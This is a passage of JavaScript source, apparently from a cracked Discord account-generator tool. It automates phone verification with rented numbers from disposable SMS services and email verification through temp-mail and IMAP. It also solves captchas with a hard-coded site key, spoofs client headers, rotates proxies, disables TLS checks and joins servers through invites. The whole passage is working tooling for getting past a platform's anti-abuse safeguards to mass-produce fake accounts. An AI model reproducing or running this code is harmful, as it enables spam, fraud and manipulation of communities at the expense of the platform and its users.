      get_phone_cheap_sms(potok_number).then((phone) => {
        meAtztGn1pdERnu('phone: '+JSON.stringify(phone));
        if (!phone.type) return fin({type: false});
        last_number = {
          phone: phone.number,
          id: phone.id
        };
        meAtztGn1pdERnu('last_number: '+last_number);
        var params = {
          url: 'https://discord.com/api/v8/users/@me/phone',
          method: 'POST',
          headers: {
            'authorization': token,
            'content-type': 'application/json',
            'dnt': '1',
            'referer': 'https://discord.com/channels/@me',
            'accept-language': country,
            'origin': 'https://discord.com',
            'accept-encoding': 'gzip, deflate, br',
            'accept': '*/*'
          },
          json: {
            phone: last_number.phone
          }
        };
        if (user_agent) {
          params.headers['user-agent'] = user_agent.user_agent;
          params.headers['x-super-properties'] = user_agent.base64;
        } else {
          params.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36';
          params.headers['x-super-properties'] = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xNDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijc1LjAuMzc3MC4xNDIiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTk5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=';
        }
        if (proxy) {
          var proxy_type = tmp_data['proxy_type'];
          if (proxy_type == 'socks') {
            var agent = require('socks-proxy-agent');
          } else {
            var agent = require('https-proxy-agent')
          }
          params.agent = new agent(`${proxy_type}://${proxy}`);
        }
        params.timeout = 15000;
        req(params, (err, response, body) => {
          meAtztGn1pdERnu(body);
          if (err || !response || !response.statusCode) return fin({type: false, err: 'dont_body'});
          if (response.statusCode != 204) return fin({type: false, err: response.statusCode});
          get_code_from_phone_cheapsms(last_number.id, potok_number).then(async (code) => {
            if (!code.type) return fin({type: false});
            var code = code.code
            code = code.replace(/ /g, '')
            var h = [
              `authorization: ${token}`,
              'content-type: application/json',
              'dnt: 1',
              'sec-fetch-dest: empty',
              'sec-fetch-mode: cors',
              'sec-fetch-site: same-origin',
              `referer: https://discord.com/channels/@me`,
              `accept-language: ru`,
              `cookie: ${cookie}`,
              'origin: https://discord.com',
              'accept: */*',
              `user-agent: ${user_agent.user_agent}`,
              `x-super-properties: ${user_agent.base64}`
            ];
            var params = {
              code
            };
            var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
            meAtztGn1pdERnu(data.body);
            if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
            if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
            return fin({ type: true });
          });
        });
      })
    } else if (type_verify == 6) {
      get_phone_onlinesim(potok_number).then(async (phone) => {
        meAtztGn1pdERnu('phone: '+JSON.stringify(phone));
        if (!phone.type) return fin({type: false});
        last_number = {
          phone: phone.number,
          id: phone.id
        };
        meAtztGn1pdERnu('last_number: '+last_number);
        var phone = last_number.phone
        var h = [
          `authorization: ${token}`,
          'content-type: application/json',
          'dnt: 1',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-origin',
          `referer: https://discord.com/channels/@me`,
          `accept-language: ru`,
          `cookie: ${cookie}`,
          'origin: https://discord.com',
          'accept: */*',
          `user-agent: ${user_agent.user_agent}`,
          `x-super-properties: ${user_agent.base64}`
        ];
        var params = {
          phone
        };
        var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
        if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
        if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
        //if (response.statusCode != 204) return fin({type: false, err: response.statusCode});
        get_code_from_phone_onlinesim(last_number.id, potok_number).then(async (code) => {
          if (!code.type) return fin({type: false});
          var code = code.code;
          code = code.replace(/ /g, '')
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];
          var params = {
            code
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
          meAtztGn1pdERnu(data.body);
          if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          return fin({ type: true });
        });
      })
    } else if (type_verify == 7) {
      get_phone_5sim(potok_number).then((phone) => {
        if (!phone.type) return fin({type: false, err: 5669});
        var number = phone.number;
        var data_id = phone.id;
        set_ready_number_5sim(data_id).then(async (check) => {
          if (!check.type) return fin({type: false, err: 187});
          var phone = `+${number}`;
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];
          var params = {
            phone
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
          if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          meAtztGn1pdERnu('SSS');
          get_code_from_phone_5sim(data_id).then(async (code) => {
            meAtztGn1pdERnu('code: '+code);
            if (!code.type) return fin({type: false, err: code.err});
            var code = code.code
            code = code.replace(/ /g, '')
            var h = [
              `authorization: ${token}`,
              'content-type: application/json',
              'dnt: 1',
              'sec-fetch-dest: empty',
              'sec-fetch-mode: cors',
              'sec-fetch-site: same-origin',
              `referer: https://discord.com/channels/@me`,
              `accept-language: ru`,
              `cookie: ${cookie}`,
              'origin: https://discord.com',
              'accept: */*',
              `user-agent: ${user_agent.user_agent}`,
              `x-super-properties: ${user_agent.base64}`
            ];
            var params = {
              code
            };
            var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
            meAtztGn1pdERnu(data.body);
            if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
            if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
            return fin({ type: true });
          });
        });
      })
    } else if (type_verify == 8) {
      get_phone_sms_online(potok_number).then((phone) => {
        if (!phone.type) return fin({type: false, err: 5669});        
        var data_id = phone.id;
        var phone = phone.number;
        if (phone.indexOf('+') < 0) phone = `+${phone}`
        set_ready_number_sms_online(data_id).then(async (check) => {
          if (!check.type) return fin({type: false, err: 187});
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-mode: cors',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];          
          var params = {
            phone
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
          if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          get_code_from_phone_sms_online(data_id).then(async (code) => {
            meAtztGn1pdERnu('code: ' + code);
            if (!code.type) return fin({ type: false, err: code.err });
            var code = code.code
            code = code.replace(/ /g, '')
            var h = [
              `authorization: ${token}`,
              'content-type: application/json',
              'dnt: 1',
              'sec-fetch-dest: empty',
              'sec-fetch-mode: cors',
              'sec-fetch-site: same-origin',
              `referer: https://discord.com/channels/@me`,
              `accept-language: ru`,
              `cookie: ${cookie}`,
              'origin: https://discord.com',
              'accept: */*',
              `user-agent: ${user_agent.user_agent}`,
              `x-super-properties: ${user_agent.base64}`
            ];
            var params = {
              code
            };
            var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
            meAtztGn1pdERnu(data.body);
            if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
            if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
            return fin({ type: true });
          });
        });
      })
    } else if (type_verify == 9) {
      get_phone_vak_sms(potok_number).then(async (phone) => {
        if (!phone.type) return fin({type: false, err: 5669});        
        var data_id = phone.id;
        var phone = `+${phone.number}`
        var h = [
          `authorization: ${token}`,
          'content-type: application/json',
          'dnt: 1',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-origin',
          `referer: https://discord.com/channels/@me`,
          `accept-language: ru`,
          `cookie: ${cookie}`,
          'origin: https://discord.com',
          'accept: */*',
          `user-agent: ${user_agent.user_agent}`,
          `x-super-properties: ${user_agent.base64}`
        ];          
        var params = {
          phone
        };
        var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
        if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
        if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
        get_code_from_phone_vak_sms(data_id).then(async (code) => {
          meAtztGn1pdERnu('code: '+code);
          if (!code.type) return fin({type: false, err: code.err});
          var code = code.code
          code = code.replace(/ /g, '')
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];
          var params = {
            code
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
          meAtztGn1pdERnu(data.body);
          if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          return fin({ type: true });
        });
      })
    } else if (type_verify == 10) {
      get_phone_simsms(potok_number).then(async (phone) => {
        if (!phone.type) return fin({type: false, err: 5669});
        var data_id = phone.id;
        var phone = phone.number;
        if (phone.indexOf('+') < 0) phone = `+${phone}`
        var h = [
          `authorization: ${token}`,
          'content-type: application/json',
          'dnt: 1',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-origin',
          `referer: https://discord.com/channels/@me`,
          `accept-language: ru`,
          `cookie: ${cookie}`,
          'origin: https://discord.com',
          'accept: */*',
          `user-agent: ${user_agent.user_agent}`,
          `x-super-properties: ${user_agent.base64}`
        ];          
        var params = {
          phone
        };
        var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
        if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
        if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
        get_code_from_phone_simsms(data_id).then(async (code) => {
          meAtztGn1pdERnu('code: '+code);
          if (!code.type) return fin({type: false, err: code.err});
          var code = code.code
          code = code.replace(/ /g, '')
          var h = [
            `authorization: ${token}`,
            'content-type: application/json',
            'dnt: 1',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            `referer: https://discord.com/channels/@me`,
            `accept-language: ru`,
            `cookie: ${cookie}`,
            'origin: https://discord.com',
            'accept: */*',
            `user-agent: ${user_agent.user_agent}`,
            `x-super-properties: ${user_agent.base64}`
          ];
          var params = {
            code
          };
          var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
          meAtztGn1pdERnu(data.body);
          if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
          if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
          return fin({ type: true });
        });
      })
    }
    else if (type_verify == 11) {
     get_phone_smspva(potok_number).then(async (phone) => {
       if (!phone.type) return fin({type: false, err: 5669});
       var data_id = phone.id;
       var phone = phone.number;
       if (phone.indexOf('+') < 0) phone = `+${phone}`
       var h = [
        `authorization: ${token}`,
        'content-type: application/json',
        'dnt: 1',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        `referer: https://discord.com/channels/@me`,
        `accept-language: ru`,
        `cookie: ${cookie}`,
        'origin: https://discord.com',
        'accept: */*',
        `user-agent: ${user_agent.user_agent}`,
        `x-super-properties: ${user_agent.base64}`
      ];          
      var params = {
        phone
      };
      var data = await curlReq('https://discord.com/api/v8/users/@me/phone', 'POST', params, h, proxy);
      if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
      if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
       get_code_from_phone_smspva(data_id).then(async (code) => {
         meAtztGn1pdERnu('code: ' + code);
         if (!code.type) return fin({ type: false, err: code.err });
         var code = code.code
         code = code.replace(/ /g, '')
         var h = [
          `authorization: ${token}`,
          'content-type: application/json',
          'dnt: 1',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-origin',
          `referer: https://discord.com/channels/@me`,
          `accept-language: ru`,
          `cookie: ${cookie}`,
          'origin: https://discord.com',
          'accept: */*',
          `user-agent: ${user_agent.user_agent}`,
          `x-super-properties: ${user_agent.base64}`
        ];
        var params = {
          code
        };
        var data = await curlReq('https://discord.com/api/v8/users/@me/phone/verify', 'POST', params, h, proxy);
        meAtztGn1pdERnu(data.body);
        if (!data.type) return fin({type: false, err: `dont_body: ${data.err.toString()}`});
        if (data.statusCode != 204) return fin({type: false, err: `${data.statusCode} ${JSON.stringify(data.body)}`});
        return fin({ type: true });
       });
     })
   }
  });
}

var getRightUrlDiscord = (url) => {
  return new Promise(async fin => {
    try {
      if (url.indexOf('token=') < 0) {
        req(url, {}, (err, response, vody) => {
          if (err || response.statusCode != 200) return fin({type: false, err: 'wrong_token'});
          var url = response.request.href;
          return fin({type: true, url});
        })
      } else {
        return fin({type: true, url});
      }
    } catch (err) {
      return fin({type: false, err})
    }
  })
}

// function get_verify_url_from_message(email) {
//   return new Promise(fin => {
//     //email = md5(email);
//     var i = 0;
//     if (imapCache.length > 0) {
//       var checkCache = false;
//       imapCache.forEach(e => {
//         if (e.to == email) checkCache = e.url
//       })
//       if (checkCache) {
//         var token = urlcheckCache.substr(checkCache.indexOf('token=') + 6);
//         return fin({ type: true, token });
//       }
//     }
//     var inter = setInterval(async () => {
//       i++;
//       if (i > 5) {
//         clearInterval(inter);
//         return fin({ type: false, err: 3247 });
//       }
//       meAtztGn1pdERnu(defImapConnection);
//       var fetch = await getUrlImap(defImapConnection, email);
//       meAtztGn1pdERnu(fetch)
//       if (!fetch.type) return;
//       clearInterval(inter);
//       var url = fetch.url;
//       var token = url.substr(url.indexOf('token=') + 6);
//       return fin({ type: true, token });
//     }, 7500);
//   });
// }

function getImapConfig() {
    var config = false;
    var checkConfig = window.localStorage['imap-settings']
    if (checkConfig) config = JSON.parse(checkConfig);
    return config;
}

// try {
//   process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
// } catch (err) {}

function checkImapConnectiopn(email, password) {
  return new Promise(async fin => {
    try {
      var imaps = require('imap-simple');
      var Config = getImapConfig();
      var config = {
        imap: {
          user: email,
          password,
          host: Config['server'].replace(' ', '').replace(' ', '').replace(' ', ''),
          port: parseInt(Config['port']),
          tls: true,
          authTimeout: 20000,
          // tlsOptions: {
          //   rejectUnauthorized: false
          // }
        },
        onmail: () => {},
      };
      addCheckEmailAccount(email);
      //console.log('config', config);
      imaps.connect(config).then(function (connection) {
        meAtztGn1pdERnu('CONNECT!');
        return connection.openBox('INBOX').then(function () {
          if (email.indexOf('outlook') >= 0 || email.indexOf('hotmail') >= 0 || email.indexOf('office365') >= 0) {
            connection.openBox('Junk').then(function () {
              meAtztGn1pdERnu('YES');
              getUrlImap(connection);
              return fin({ type: true, connection })
            });
          } else {
            meAtztGn1pdERnu('YES');
            getUrlImap(connection);
            return fin({ type: true, connection })
          }
        });
      }).catch(err => {
        return fin({ type: false })
      });
    } catch (err) {
      console.error(err);
      return fin({ type: false, err })
    }
  })
}

function createImapConnection(email, emailPassword) {
  return new Promise(async fin => {
      try {
          var imaps = require('imap-simple');
          var Config = getImapConfig();
          var config = {
              imap: {
                  user: email,
                  password: emailPassword,
                  host: Config['server'].replace(' ', '').replace(' ', '').replace(' ', ''),
                  port: parseInt(Config['port']),
                  tls: true,
                  authTimeout: 20000
              },
              onmail: async function (numNewMail, asda, asdas) {
                  if (!checkEventImap) return;
                  meAtztGn1pdERnu('EVENT!')
                  // var check = await getUrlImap(defConection);
                  // if (check.type) {
                  //   imapCache.push({
                  //     to,
                  //     url: check.url
                  //   });
                  // }
              },
          };
          //console.log('config', config);
          imaps.connect(config).then(function (connection) {
              meAtztGn1pdERnu('CONNECT!');
              return connection.openBox('INBOX').then(function () {
                // if (email.indexOf('outlook') >= 0 || email.indexOf('hotmail') >= 0 || email.indexOf('office365') >= 0) {
                //   connection.openBox('Junk').then(function () {
                //     meAtztGn1pdERnu('YES');
                //     getUrlImap(connection);
                //     return fin({ type: true, connection })
                //   });
                // } else {
                  meAtztGn1pdERnu('YES');
                  getUrlImap(connection);
                  return fin({ type: true, connection })
                // }              
              });
          }).catch(err => {
              noty('error', `Error With Connect Imap Server.<br>Err: ${err.toString()}`);
              return fin({ type: false })
          });
      } catch (err) {
          //console.error(err);
          return fin({type: false, err})
      }
  })
}

var typeOfEmailVerifications = 'temp';

function get_verify_url_from_message(email, emailPassword = false) {
  return new Promise(async fin => {    
    var i = 0;
    if (typeOfEmailVerifications == 'temp') {
      email = md5(email);
      var inter = setInterval(() => {
        i++;
        if (i > 5) {
          clearInterval(inter);
          return fin({ type: false, err: 3247 });
        }
        var params = {
          url: `https://api4.temp-mail.org/request/mail/id/${email}/format/json`,
          method: 'GET'
        };
        req(params, (err, response, body) => {
          if (err || !response || response.statusCode != 200 || !body) {
            clearInterval(inter);
            return fin({ type: false, err: 4521 });
          }
          body = JSON.parse(body);
          if (body.error || body.length <= 0) return;
          var message = body[0];
          if (message.mail_from.indexOf('discord.com') < 0) {
            clearInterval(inter);
            return fin({ type: false, err: 9741 });
          }
          clearInterval(inter);
          message = message.mail_text;
          for (var q = 0; q < 30; q++) message = message.replace('\n', '');
          var parseUrl = (html) => {
            try {
              var data = html.match(/\bhttps?:\/\/\S+/gi);
              if (!data || typeof data != 'object' || data.length < 1) return false;
              return data[0]
            } catch (err) {
              return false;
            }
          }
          var url = parseUrl(message)
          if (!url) return fin({ type: false });
          if (url.indexOf('token=') >= 0) {
            var token = url.substr(url.indexOf('token=') + 6);
            return fin({ type: true, token: token });
          }
          req(url, {}, (err, response, vody) => {
            if (err || response.statusCode != 200) return fin({ type: false, err: 'wrong_token' });
            var url = response.request.href;
            var token = url.substr(url.indexOf('token=') + 6);
            return fin({ type: true, token: token });
          })
        })
      }, 7500);
    } else {
        var connection = await createImapConnection(email, emailPassword);
        if (!connection.type) return fin({type: false, err: connection.err});
        connection = connection.connection
        var i = 0;
        if (imapCache.length > 0) {
            var checkCache = false;
            imapCache.forEach(e => {
                if (e.to == email) checkCache = e.url
            })
            if (checkCache) {
                var token = urlcheckCache.substr(checkCache.indexOf('token=') + 6);
                return fin({ type: true, token });
            }
        }
        var inter = setInterval(async () => {
            i++;
            if (i > 5) {
                clearInterval(inter);
                try {
                  connection.end();
                } catch (err) {
                  console.error(err)
                }
                return fin({ type: false, err: 3247 });
            }
            meAtztGn1pdERnu(connection);
            //console.log('connection', connection);
            var fetch = await getUrlImap(connection, email);
            meAtztGn1pdERnu(fetch)
            if (!fetch.type) return;
            clearInterval(inter);
            var url = fetch.url;
            var token = url.substr(url.indexOf('token=') + 6);
            try {
              connection.end();
            } catch (err) {
              console.error(err)
            }
            return fin({ type: true, token });
            var params = {
                url: `https://api4.temp-mail.org/request/mail/id/${email}/format/json`,
                method: 'GET'
            };
            req(params, (err, response, body) => {
                if (err || !response || response.statusCode != 200 || !body) {
                    clearInterval(inter);
                    return fin({ type: false, err: 4521 });
                }
                body = JSON.parse(body);
                if (body.error || body.length <= 0) return;
                var message = body[0];
                if (message.mail_from.indexOf('discord.com') < 0) {
                    clearInterval(inter);
                    return fin({ type: false, err: 9741 });
                }
                clearInterval(inter);
                message = message.mail_text;
                for (var q = 0; q < 30; q++) message = message.replace('\n', '');
                var url = message.substr(message.indexOf('http'));
                req(url, {}, (err, response, vody) => {
                    if (err || response.statusCode != 200) return fin({ type: false, err: 'wrong_token' });
                    var url = response.request.href;
                    var token = url.substr(url.indexOf('token=') + 6);
                    return fin({ type: true, token: token });
                })
            })
        }, 7500);
    }
  });
}

function add_log_inviting_acc(email) {
  var html = `${translater(translate[147])} - ${email}`;
  add_log(html, 1)
}

function invite_acc(token, invite, email, proxy = false, user_agent = false) {
  return new Promise(fin => {
    add_log_inviting_acc(email)
    var params = {
      url: `https://discord.com/api/v8/invites/${invite}`,
      method: 'POST',
      headers: {
        'authorization': token,
        // 'content-type': 'application/json',
        // 'dnt': '1',
        // 'referer': 'https://discord.com/activity',
        // 'accept-language': country,
        // 'origin': 'https://discord.com',
        // 'accept': '*/*'
      },
    }
    if (user_agent) {
      params.headers['user-agent'] = user_agent.user_agent;
      params.headers['x-super-properties'] = user_agent.base64;
    } else {
      params.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36';
      params.headers['x-super-properties'] = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc1LjAuMzc3MC4xNDIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijc1LjAuMzc3MC4xNDIiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTk5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=';
    }
    req(params, (err, response, body) => {
      meAtztGn1pdERnu(body);
      if (err || !response || !response.statusCode || !body) return fin({type: false, err: '817_1'});
      if (response.statusCode != 200) {
        if (body.indexOf('message') >= 0) {
          if (JSON.parse(body).message.indexOf('verify') >= 0) return fin({type: false, err: 45});
          return fin({type: false, err: `4579: ${body}`});
        }
        return fin({type: false, err: 4579});
      }
      return fin({type: true});
    })
  });
}

function update_tmp(type, value) {
  if (!localStorage['tmp_data_reger'] || !tmp_data) tmp_data = {};
  tmp_data[type] = value;
  localStorage.setItem('tmp_data_reger', JSON.stringify(tmp_data));
}

function add_log_verify_email(email) {
  var html = `${translater(translate[146])} - ${email}`;
  add_log(html, 1)
}

function update_online() {
  console.log('[Crack] Blocked Generator V1 Updater #83761');
}

function verify_email(token, email, proxy = false, user_agent = false, cookie = '', emailPassword = false) {
  return new Promise(fin => {
    add_log_verify_email(email)
    get_verify_url_from_message(email, emailPassword).then((data) => {
      if (!data.type) return fin({type: false, err: data.err});
      meAtztGn1pdERnu(data);
      var verifyToken = data.token;
      var url = `https://discord.com/verify#token=${verifyToken}`;
      var data_key = '6Lef5iQTAAAAAKeIvIY-DeexoO3gj7ryl9rLMEnn';
      res_cap(data_key, url, 1, $('#apikey_captcha').val(), proxy, true).then(async (check) => {
        if (!check.type) return fin({type: false, err: `778_${check.err}`});
        var cap_token = check.token;
        meAtztGn1pdERnu(cap_token);
        var h = [
          `authorization: ${token}`,
          'content-type: application/json',
          'dnt: 1',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-origin',
          `referer: ${url}`,
          `accept-language: ru`,
          `cookie: ${cookie}`,
          'origin: https://discord.com',
          'accept: */*',
          `user-agent: ${user_agent.user_agent}`,
          `x-super-properties: ${user_agent.base64}`
        ];
        var params = {
          captcha_key: cap_token,
          token: verifyToken
        }
        var data = await curlReq('https://discord.com/api/v8/auth/verify', 'POST', params, h, proxy);
        meAtztGn1pdERnu(data);
        if (!data.type) return fin({type: false, err: '014_1'});
        var body = data.body;
        if (JSON.stringify(body).indexOf('captcha_key') >= 0) return fin({type: false, err: 'captcha_key'});
        if (data.statusCode != 200) return fin({type: false, err: 6327});
        return fin({type: true});
      });
    })
  });
}

function curlReq(url, method = 'GET', params = false, headers = [], proxy = false) {
  return new Promise(async fin => {
    try {
      var Curl = require('node-libcurl').Curl;
      var curl = new Curl();
      curl.setOpt(52, true);
      if (proxy) {
        if (tmp_data['proxy_type'] == 'socks') {
          curl.setOpt(Curl.option.PROXYTYPE, Curl.proxy.SOCKS5);
          curl.setOpt(Curl.option.PROXY, proxy);
        } else {
          curl.setOpt(Curl.option.PROXY, `http://${proxy}`);
        }
      }      
      curl.setOpt(Curl.option.TIMEOUT_MS, 20000);
      curl.setOpt(10102, '');
      if (method == 'POST') curl.setOpt(47, 1);
      curl.setOpt(Curl.option.SSL_VERIFYPEER, false);
      curl.setOpt(10036, method);
      curl.setOpt(10002, url);
      curl.setOpt(10031, '');
      curl.setOpt(10135, '');

      if (params) {
        params = JSON.stringify(params);
        if (headers.indexOf('content-type: application/json') < 0) headers.push('content-type: application/json');
        if (headers.indexOf(`content-length: ${params.length}`) < 0) headers.push(`content-length: ${params.length}`);
        curl.setOpt(10015, params);
      }
      //if (headers.length > 0) headers.push('x-requested-with: XMLHttpRequest')
      curl.setOpt(10023, headers);

      curl.on('end', function (statusCode, body, headers) {
        this.close();
        try {
          if (body.indexOf('{') >= 0) body = JSON.parse(body);
        } catch (err) {}
        return fin({type: true, body, statusCode, headers});
      });
      curl.on('error', function (err) {
        return fin({type: false, err});
      });
      curl.perform();
    } catch (err) {
      return fin({type: false, err: 451})
    }
  })
}

function finish_operation_onlinesim(id) {
  var params = {
    url: `http://onlinesim.ru/api/setOperationOk.php?apikey=${apikey_verify_phone}&tzid=${id}`,
    method: 'GET'
  };
  req(params, () => {});
}

function check_proxy(proxy) {
  return new Promise(fin => {
    var limit = 7500;

    var timer = setTimeout(() => {
      return fin(false);
    }, limit);

    var Curl = require('node-libcurl').Curl;
    var curl = new Curl();
    //curl.setOpt(52, true);
    // if (tmp_data['proxy_type'] == 'socks') {
    //   curl.setOpt(Curl.option.PROXYTYPE, Curl.proxy.SOCKS5);
    //   curl.setOpt(Curl.option.PROXY, proxy);
    // } else {
      curl.setOpt(Curl.option.PROXY, `http://${proxy}`);
    // }
    curl.setOpt(Curl.option.SSL_VERIFYPEER, false);
    //curl.setOpt(41, true);
    curl.setOpt(43, false);
    curl.setOpt(10102, '');
    curl.setOpt(10036, 'GET');
    curl.setOpt(10002, 'https://discord.com/api/v8/auth');
    //curl.setOpt(155, 0);
    curl.setOpt(10031, '');
    curl.setOpt(10135, '');
    curl.setOpt(Curl.option.TIMEOUT_MS, limit);

    curl.on('end', function(statusCode, body, headers) {
      clearTimeout(timer);
      this.close();
      if (!body) return fin(false);
      return fin(true);
    });
    curl.on('error', function () {
      clearTimeout(timer);
      return fin(false);
    });
    curl.perform();
    return;
    var params = {
      url: 'https://discord.com/api/v8/auth',
      method: 'GET',
      timeout: limit
    };
    var proxy_type = tmp_data['proxy_type'];
    if (proxy_type == 'socks') {
      var agent = require('socks-proxy-agent');
    } else {
      var agent = require('https-proxy-agent')
    }
    params.agent = new agent(`${proxy_type}://${proxy}`);
    req(params, (err, response, body) => {
      clearTimeout(timer);
      if (err || !response) return fin(false);
      return fin(true);
    });
  });
}
function restart_window() {
  document.location.reload();
}

